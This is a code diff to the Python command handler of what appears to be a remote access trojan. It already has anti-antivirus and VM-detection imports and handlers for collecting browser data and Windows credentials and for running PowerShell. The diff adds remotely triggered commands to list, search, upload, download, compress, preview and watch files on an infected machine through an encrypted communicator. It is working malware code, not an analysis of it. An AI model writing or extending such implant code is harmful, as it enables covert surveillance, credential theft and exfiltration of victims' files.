@@ -20,6 +20,7 @@ from system.anti_av import AntiAV
 from system.file_manager import FileManager
 from system.collector import SystemCollector
 from system.vm_detector import VMDetector
+from system.advanced_file_manager import AdvancedFileManager
 
 class CommandError(Exception):
     """Command execution related errors"""
@@ -108,6 +109,18 @@ class CommandHandler:
             'get_browser_data': CommandHandler.handle_collect_browser_data_comprehensive,  # نام جایگزین
             'get_comprehensive_browser_data': CommandHandler.handle_collect_browser_data_comprehensive,
             'get_windows_credentials': CommandHandler.handle_windows_credentials,
+
+            # دستورات جدید File Manager
+            'file_advanced': CommandHandler.handle_file_operation_advanced,
+            'file_list_advanced': CommandHandler.handle_file_operation_advanced,
+            'file_search': CommandHandler.handle_file_operation_advanced,
+            'file_upload_chunked': CommandHandler.handle_file_operation_advanced,
+            'file_download_resumable': CommandHandler.handle_file_operation_advanced,
+            'file_compress': CommandHandler.handle_file_operation_advanced,
+            'file_extract': CommandHandler.handle_file_operation_advanced,
+            'file_find_duplicates': CommandHandler.handle_file_operation_advanced,
+            'file_preview': CommandHandler.handle_file_operation_advanced,
+            'file_watch': CommandHandler.handle_file_operation_advanced,
         }
 
         handler = handlers.get(command_type)
@@ -1326,3 +1339,122 @@ class CommandHandler:
         except Exception as e:
             logging.error(f"PowerShell execution error: {str(e)}")
             raise CommandError(f"PowerShell execution error: {str(e)}")
+        
+    @staticmethod
+    def handle_file_operation_advanced(params):
+        """Handler جدید برای عملیات پیشرفته فایل"""
+        try:
+            # تبدیل params
+            if isinstance(params, list):
+                if params and isinstance(params[0], dict):
+                    params = params[0]
+                else:
+                    params = {}
+            
+            action = params.get('action')
+            if not action:
+                return {"status": "error", "message": "No action specified"}
+            
+            # ایجاد instance از AdvancedFileManager
+            encryption_manager = CommandHandler._get_encryption_manager()
+            communicator = CommandHandler._get_communicator()
+            file_manager = AdvancedFileManager(encryption_manager, communicator)
+            
+            if action == 'list_advanced':
+                path = params.get('path', os.getcwd())
+                page = params.get('page', 1)
+                page_size = params.get('page_size', 50)
+                sort_by = params.get('sort_by', 'name')
+                order = params.get('order', 'asc')
+                show_hidden = params.get('show_hidden', False)
+                
+                return file_manager.list_files_advanced(
+                    path, page, page_size, sort_by, order, show_hidden
+                )
+            
+            elif action == 'search_files':
+                root_path = params.get('root_path', os.getcwd())
+                pattern = params.get('pattern', '')
+                search_type = params.get('search_type', 'name')
+                max_results = params.get('max_results', 100)
+                case_sensitive = params.get('case_sensitive', False)
+                
+                return file_manager.search_files(
+                    root_path, pattern, search_type, max_results, case_sensitive
+                )
+            
+            elif action == 'upload_chunked':
+                local_path = params.get('local_path')
+                remote_path = params.get('remote_path')
+                chunk_index = params.get('chunk_index', 0)
+                total_chunks = params.get('total_chunks')
+                
+                if not local_path or not remote_path:
+                    return {"status": "error", "message": "Missing local_path or remote_path"}
+                
+                return file_manager.upload_file_chunked(
+                    local_path, remote_path, chunk_index, total_chunks
+                )
+            
+            elif action == 'download_resumable':
+                remote_path = params.get('remote_path')
+                local_path = params.get('local_path')
+                offset = params.get('offset', 0)
+                
+                if not remote_path or not local_path:
+                    return {"status": "error", "message": "Missing remote_path or local_path"}
+                
+                return file_manager.download_file_resumable(
+                    remote_path, local_path, offset
+                )
+            
+            elif action == 'compress_files':
+                file_paths = params.get('file_paths', [])
+                archive_path = params.get('archive_path')
+                format = params.get('format', 'zip')
+                
+                if not file_paths or not archive_path:
+                    return {"status": "error", "message": "Missing file_paths or archive_path"}
+                
+                return file_manager.compress_files(file_paths, archive_path, format)
+            
+            elif action == 'extract_archive':
+                archive_path = params.get('archive_path')
+                dest_path = params.get('dest_path')
+                
+                if not archive_path or not dest_path:
+                    return {"status": "error", "message": "Missing archive_path or dest_path"}
+                
+                return file_manager.extract_archive(archive_path, dest_path)
+            
+            elif action == 'find_duplicates':
+                root_path = params.get('root_path', os.getcwd())
+                compare_by = params.get('compare_by', 'hash')
+                
+                return file_manager.find_duplicate_files(root_path, compare_by)
+            
+            elif action == 'get_preview':
+                file_path = params.get('file_path')
+                max_lines = params.get('max_lines', 50)
+                
+                if not file_path:
+                    return {"status": "error", "message": "Missing file_path"}
+                
+                return file_manager.get_file_preview(file_path, max_lines)
+            
+            elif action == 'start_watcher':
+                path = params.get('path', os.getcwd())
+                file_manager.start_file_watcher(path)
+                return {"status": "success", "message": f"Started watching {path}"}
+            
+            elif action == 'stop_watcher':
+                path = params.get('path')
+                file_manager.stop_file_watcher(path)
+                return {"status": "success", "message": "Stopped watcher"}
+            
+            else:
+                return {"status": "error", "message": f"Unknown advanced file action: {action}"}
+                
+        except Exception as e:
+            logging.error(f"Advanced file operation error: {str(e)}")
+            return {"status": "error", "message": f"Operation failed: {str(e)}"}
